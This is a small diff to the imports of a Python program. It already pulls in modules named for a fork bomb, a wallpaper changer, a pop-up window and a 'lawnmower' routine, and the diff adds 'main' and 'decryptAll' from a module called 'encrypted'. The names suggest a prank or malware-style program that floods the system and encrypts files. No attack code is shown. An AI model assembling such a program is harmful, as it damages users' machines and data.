@@ -4,6 +4,8 @@ from change_wallpaper import change_wallpaper
 from fork_bomb_window import fork_bomb_window
 from initial_pop_up_window import initial_pop_up_run
 from lawnmower import main as lawnmowerMain
+from encrypted import main as encryptedMain
+from encrypted import decryptAll
 import random
 import time
 import os
